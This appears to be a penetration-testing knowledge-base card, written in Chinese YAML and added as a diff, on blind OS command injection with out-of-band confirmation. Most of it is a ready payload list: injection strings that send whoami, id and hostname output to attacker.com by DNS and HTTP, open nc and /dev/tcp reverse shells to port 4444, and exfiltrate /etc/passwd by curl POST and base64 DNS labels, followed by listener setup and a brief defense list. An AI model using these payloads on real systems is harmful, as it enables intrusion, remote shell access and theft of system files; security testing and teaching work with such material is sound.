@@ -1,0 +1,87 @@
+# 技术卡片: 命令注入 - 盲注 OOB 外带
+# 分类: cmd-injection / blind-oob
+# 版本: 1.0
+# 日期: 2026-07-21
+# 来源: SecAtlas KB-CMD-003
+
+id: "cmd-blind-oob"
+name: "命令注入盲注 OOB 外带（DNS/HTTP/TCP）"
+category: "cmd-injection"
+subcategory: "blind-oob"
+severity: "critical"
+
+description: |
+  命令注入无回显时，利用 OS 内置工具发起带外信道确认执行。
+  DNS 查询（nslookup/dig/ping）向攻击者域名发起查询，
+  nc/curl 回连攻击者监听端口。
+
+trigger_signals:
+  - "命令注入疑似存在但无直接回显"
+  - "sleep/ping 延迟测试不确定"
+  - "需要证明命令执行和数据外泄能力"
+
+payloads:
+  dns_oob:
+    linux:
+      - >
+          ; nslookup $(whoami).attacker.com
+      - >
+          ; nslookup `whoami`.attacker.com
+      - >
+          | nslookup $(id).attacker.com
+      - >
+          & dig +short $(hostname).attacker.com
+    windows:
+      - "& nslookup %USERNAME%.attacker.com"
+      - "| nslookup %COMPUTERNAME%.attacker.com"
+
+  http_oob:
+    linux:
+      - >
+          ; curl http://attacker.com/$(whoami)
+      - >
+          | wget -qO- http://attacker.com/`hostname`
+    windows:
+      - "& curl http://attacker.com/%USERNAME%"
+
+  tcp_oob:
+    linux:
+      - >
+          ; nc attacker.com 4444 -e /bin/sh
+      - >
+          | bash -c 'exec 3<>/dev/tcp/attacker.com/4444; echo $(whoami) >&3'
+    windows:
+      - "& nc.exe attacker.com 4444 -e cmd.exe"
+
+  data_exfil:
+    linux:
+      - >
+          ; curl http://attacker.com/ -d @/etc/passwd
+      - >
+          | nslookup $(cat /etc/passwd | base64 | head -c 50).attacker.com
+
+detection_setup:
+  - "Burp Collaborator: 生成唯一域名 → 注入 → 观察 DNS/HTTP 请求"
+  - "Interactsh: interactsh-client → 生成域名"
+  - "自建 VPS: nc -lvnp 4444 + 域名 DNS 日志"
+
+success_indicators:
+  - "Burp Collaborator / Interactsh 收到 DNS 查询"
+  - "HTTP 请求到达攻击者服务器"
+  - "TCP 回连成功（nc 收到连接）"
+  - "DNS 查询含 whoami/hostname 输出"
+
+prerequisites:
+  - "命令注入点存在（分号/管道/命令替换）"
+  - "目标可出站 DNS（UDP 53）"
+  - "目标可出站 HTTP（TCP 80/443）或 TCP 任意端口"
+
+defense:
+  - "出口防火墙限制 DNS/TCP 出站到最小集合"
+  - "应用层：不拼接用户输入到 OS 命令"
+  - "监控异常 DNS 查询（长标签/高熵/外部域）"
+
+sources:
+  - kb: "KB-CMD-002 / KB-CMD-003"
+  - ref: "PortSwigger: Blind OS command injection"
+  - ref: "CWE-78"
